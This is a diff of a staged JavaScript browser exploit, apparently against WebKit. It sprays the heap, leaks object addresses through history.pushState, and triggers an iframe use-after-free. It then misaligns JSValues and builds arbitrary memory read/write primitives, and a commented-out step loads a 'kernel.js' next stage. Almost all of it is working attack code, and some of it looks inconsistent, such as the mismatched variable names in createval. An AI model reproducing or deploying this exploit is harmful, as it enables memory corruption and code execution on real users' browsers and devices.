@@ -11,11 +11,11 @@ function makeid() {
 };
 
 var instancespr = [];
+
 for(var i=0; i<2048; i++) {
   instancespr[i] = {};
   instancespr[i][makeid()] = 50057; /* spray 4-field Object InstanceIDs */
 }
-
 for(var i=2048; i<4096; i++) {
   instancespr[i] = new Uint32Array(1);
   instancespr[i][makeid()] = 50057; /* spray 4-field Object InstanceIDs */
@@ -24,108 +24,105 @@ for(var i=2048; i<4096; i++) {
 var _dview;
 
 function u2d(low, hi) {
-    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
-    _dview.setUint32(0, hi);
-    _dview.setUint32(4, low);
-    return _dview.getFloat64(0);
+  if (!_dview) _dview = new DataView(new ArrayBuffer(16));
+  _dview.setUint32(0, hi);
+  _dview.setUint32(4, low);
+  return _dview.getFloat64(0);
 }
 
-function int64(low, hi) {
-    this.low = (low >>> 0);
-    this.hi = (hi >>> 0);
+function int64(low,hi) {
+  this.low = (low>>>0);
+  this.hi = (hi>>>0);
 
-    this.add32inplace = function(val) {
-        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
-        var new_hi = (this.hi >>> 0);
+  this.add32inplace = function(val) {
+    var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
+    var new_hi = (this.hi >>> 0);
 
-        if (new_lo < this.low) {
-            new_hi++;
-        }
-
-        this.hi = new_hi;
-        this.low = new_lo;
+    if (new_lo < this.low) {
+      new_hi++;
     }
 
-    this.add32 = function(val) {
-        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
-        var new_hi = (this.hi >>> 0);
+    this.hi=new_hi;
+    this.low=new_lo;
+  }
 
-        if (new_lo < this.low) {
-            new_hi++;
-        }
+  this.add32 = function(val) {
+    var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
+    var new_hi = (this.hi >>> 0);
 
-        return new int64(new_lo, new_hi);
+    if (new_lo < this.low) {
+      new_hi++;
     }
 
-    this.sub32 = function(val) {
-        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
-        var new_hi = (this.hi >>> 0);
+    return new int64(new_lo, new_hi);
+  }
 
-        if (new_lo > (this.low) & 0xFFFFFFFF) {
-            new_hi--;
-        }
+  this.sub32 = function(val) {
+    var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
+    var new_hi = (this.hi >>> 0);
 
-        return new int64(new_lo, new_hi);
+    if (new_lo > (this.low) & 0xFFFFFFFF) {
+      new_hi--;
     }
 
-    this.sub32inplace = function(val) {
-        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
-        var new_hi = (this.hi >>> 0);
+    return new int64(new_lo, new_hi);
+  }
 
-        if (new_lo > (this.low) & 0xFFFFFFFF) {
-            new_hi--;
-        }
+  this.sub32inplace = function(val) {
+    var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
+    var new_hi = (this.hi >>> 0);
 
-        this.hi = new_hi;
-        this.low = new_lo;
+    if (new_lo > (this.low) & 0xFFFFFFFF) {
+      new_hi--;
     }
 
-    this.and32 = function(val) {
-        var new_lo = this.low & val;
-        var new_hi = this.hi;
-        return new int64(new_lo, new_hi);
-    }
+    this.hi=new_hi;
+    this.low=new_lo;
+  }
 
-    this.and64 = function(vallo, valhi) {
-        var new_lo = this.low & vallo;
-        var new_hi = this.hi & valhi;
-        return new int64(new_lo, new_hi);
-    }
+  this.and32 = function(val) {
+    var new_lo = this.low & val;
+    var new_hi = this.hi;
+    return new int64(new_lo, new_hi);
+  }
 
-    this.toString = function(val) {
-        val = 16;
-        var lo_str = (this.low >>> 0).toString(val);
-        var hi_str = (this.hi >>> 0).toString(val);
+  this.and64 = function(vallo, valhi) {
+    var new_lo = this.low & vallo;
+    var new_hi = this.hi & valhi;
+    return new int64(new_lo, new_hi);
+  }
 
-        if (this.hi == 0)
-            return lo_str;
-        else
-            lo_str = zeroFill(lo_str, 8)
+  this.toString = function(val) {
+    val = 16;
+    var lo_str = (this.low >>> 0).toString(val);
+    var hi_str = (this.hi >>> 0).toString(val);
 
-        return hi_str + lo_str;
-    }
+    if(this.hi == 0)
+      return lo_str;
+    else
+      lo_str = zeroFill(lo_str, 8)
 
-    this.toPacked = function() {
-        return {
-            hi: this.hi,
-            low: this.low
-        };
-    }
+    return hi_str+lo_str;
+  }
 
-    this.setPacked = function(pck) {
-        this.hi = pck.hi;
-        this.low = pck.low;
-        return this;
-    }
+  this.toPacked = function() {
+    return {hi: this.hi, low: this.low};
+  }
 
+  this.setPacked = function(pck) {
+    this.hi=pck.hi;
+    this.low=pck.low;
     return this;
+  }
+    
+  return this;
 }
 
-function zeroFill(number, width) {
+function zeroFill(number, width ) {
     width -= number.toString().length;
 
     if (width > 0) {
-        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
+        return new Array(width + (/\./.test( number ) ? 2 : 1)).join('0') + number;
     }
 
     return number + ""; // always return a string
@@ -159,6 +156,7 @@ for(var i = 0; (i < (0x4000 / 2));) {
   props[i++] = {value: 0x42424242};
   props[i++] = {value: tgt};
 }
+
 // Find address of JSValue by leaking one of the JSObject's we sprayed
 var foundLeak   = undefined;
 var foundIndex  = 0;
@@ -171,7 +169,6 @@ while(foundLeak == undefined && maxCount > 0) {
   history.pushState(y, "");
 
   Object.defineProperties({}, props);
-
 
   var leak = new Uint32Array(history.state.data.buffer);
 
@@ -222,7 +219,40 @@ var dgc = function() {
     new ArrayBuffer(0x100000);
   }
 }
- /////////////////// STAGE 3: HEAP SPRAY ///////////////////
+
+/////////////////// STAGE 2: UAF ///////////////////
+var exploit = function() {
+if(failed) {
+    return;
+  }
+try {
+    var src = document.createAttribute('src');
+    src.value = 'javascript:parent.callback()';
+     
+     // Free the iframe!
+    window.callback = () => {
+      window.callback = null;
+      
+      d.setAttributeNodeNS(src);
+      f.setAttributeNodeNS(document.createAttribute('src'));
+ };
+    f.name = "lol";
+    f.setAttributeNodeNS(src);
+    f.remove();
+    
+    f = null;
+    src = null;
+    nogc.length=0;
+    dgc();
+    
+ exploit();         
+   } catch(e) {
+    failed = true
+    fail("Exception: " + e)
+  }
+} 
+ 
+/////////////////// STAGE 3: HEAP SPRAY ///////////////////
 
     // Setup spray variables
     var objSpray  = 0x10000;
@@ -235,14 +265,13 @@ var dgc = function() {
 
     for(var i = 0; i < objSpray; i++) {
       objs[i] = new Uint32Array(objs[i].data.buffer);
-    }
+    }    
 
     /////////////////// STAGE 4: MISALIGNING JSVALUES ///////////////////
     var craftptr = leakJSVal.sub32(0x10000 - 0x10)
     tgt.b = u2d(0,craftptr.low); // 0x10000 is offset due to double encoding
     tgt.c = craftptr.hi;
     tgt.a = u2d(2048, 0x1602300);
-
     /////////////////// STAGE 3 - CONTINUED ///////////////////
 
     // Memory corruption ; not even once!
@@ -251,53 +280,21 @@ var dgc = function() {
       // The poor butterflies :(
       objs[i][2] = leakJSVal.low + 0x18 + 4;
       objs[i][3] = leakJSVal.hi;
-    }
+    }   
 
-
-    /////////////////// STAGE 5: READ/WRITE PRIMITIVE ///////////////////   
+/////////////////// STAGE 5: READ/WRITE PRIMITIVE ///////////////////   
 Array.prototype.__defineGetter__(100, () => 0);
 // Userland pwnage
-
-function exploit() {
-if(failed) {
-    return;
-  }
-try {
-postExpl();         
-   } catch(e) {
-    failed = true
-    fail("Exception: " + e)
-  }
-} 
- 
-var src = document.createAttribute('src');
-    src.value = 'javascript:parent.callback()';
-var d = document.createElement('div');
-for(var i = 0; i < 0x4000; i++) {
-      nogc.push(document.createElement('iframe'));
-    }  
 var f = document.body.appendChild(document.createElement('iframe'));
 for(var i = 0; i < 0x4000; i++) {
       nogc.push(document.createElement('iframe'));
     }
- // Free the iframe!
-    window.callback = () => {
-      window.callback = null;
-      
-      d.setAttributeNodeNS(src);
-      f.setAttributeNodeNS(document.createAttribute('src'));
-      
-      f.name = "lol";
-      f.setAttributeNodeNS(src);
-      f.remove()
-      
-      f = null;
-      src = null;
-      nogc.length = 0;
-    dgc();           
-};
- 
+var d = document.createElement('div');
 
+    // Sandwich our target iframe
+for(var i = 0; i < 0x4000; i++) {
+      nogc.push(document.createElement('iframe'));
+    }    
 var a = new f.contentWindow.Array(13.37, 13.37);
 var b = new f.contentWindow.Array(u2d(leakJSVal.low + 0x10, leakJSVal.hi), 13.37);      
 
@@ -322,10 +319,10 @@ Object.defineProperty(Array.prototype, 100,{
 });
 
 tgt.c = leakval_helper;
-var butterfly = new int64(stale[2], stale[3]);
-butterfly.low += 0x10;
-
- tgt.c = leakval_u32;
+    var butterfly = new int64(stale[2], stale[3]);
+    butterfly.low += 0x10;
+    // Set leakval_u32's vector to leakval_helper's butterfly
+    tgt.c = leakval_u32;
     var lkv_u32_old = new int64(stale[4], stale[5]);
     
     stale[4] = butterfly.low;
@@ -339,8 +336,8 @@ butterfly.low += 0x10;
     var addr_to_slavebuf = new int64(master[4], master[5]);
     tgt.c = leakval_u32;
     stale[4] = lkv_u32_old.low;
-    stale[5] = lkv_u32_old.hi; 
-       
+    stale[5] = lkv_u32_old.hi;
+
     // Restore proper JSValues
     for (var i=0; i<objSpray; i++)
     {
@@ -354,23 +351,23 @@ butterfly.low += 0x10;
 
     // Primitives :D
     var prim = {
-    write8: function(addr, val) {
+      write8: function(addr, val) {
         master[4] = addr.low;
         master[5] = addr.hi;
 
         if (val instanceof int64) {
-            slave[0] = val.low;
-            slave[1] = val.hi;
+          slave[0] = val.low;
+          slave[1] = val.hi;
         } else {
-            slave[0] = val;
-            slave[1] = 0;
+          slave[0] = val;
+          slave[1] = 0;
         }
 
         master[4] = addr_to_slavebuf.low;
         master[5] = addr_to_slavebuf.hi;
-    },
+      },
 
-    write4: function(addr, val) {
+      write4: function(addr, val) {
         master[4] = addr.low;
         master[5] = addr.hi;
 
@@ -378,9 +375,9 @@ butterfly.low += 0x10;
 
         master[4] = addr_to_slavebuf.low;
         master[5] = addr_to_slavebuf.hi;
-    },
+      },
 
-    read8: function(addr) {
+      read8: function(addr) {
         master[4] = addr.low;
         master[5] = addr.hi;
 
@@ -390,9 +387,10 @@ butterfly.low += 0x10;
         master[5] = addr_to_slavebuf.hi;
 
         return rtv;
-    },
+      },
 
-    read4: function(addr) {
+      read4: function(addr)
+      {
         master[4] = addr.low;
         master[5] = addr.hi;
 
@@ -402,32 +400,35 @@ butterfly.low += 0x10;
         master[5] = addr_to_slavebuf.hi;
 
         return rtv;
-    },
+      },
 
-    leakval: function(jsval) {
+      leakval: function(jsval)
+      {
         leakval_helper[0] = jsval;
         var rtv = this.read8(butterfly);
         this.write8(butterfly, new int64(0x41414141, 0xffffffff));
-
+          
         return rtv;
-    },
+      },
 
-    createval: function(jsval) {
+      createval: function(jsval)
+      {
         this.write8(butterfly, jsval);
-        var rtv = leakval_helper[0];
+        var rt = leakval_helper[0];
         this.write8(butterfly, new int64(0x41414141, 0xffffffff));
         return rt;
-    },   
-};
-
-window.primitives = prim; 
+      }
+    };
     
- 
-/*setTimeout(function() {
+    window.primitives = prim;
+    /*setTimeout(function() {
     sc = document.createElement("script");
     sc.src="kernel.js";
     document.body.appendChild(sc);
-  }, 100);*/
-  
+    }, 100);*/
+
+    
+   
+ 
 
  
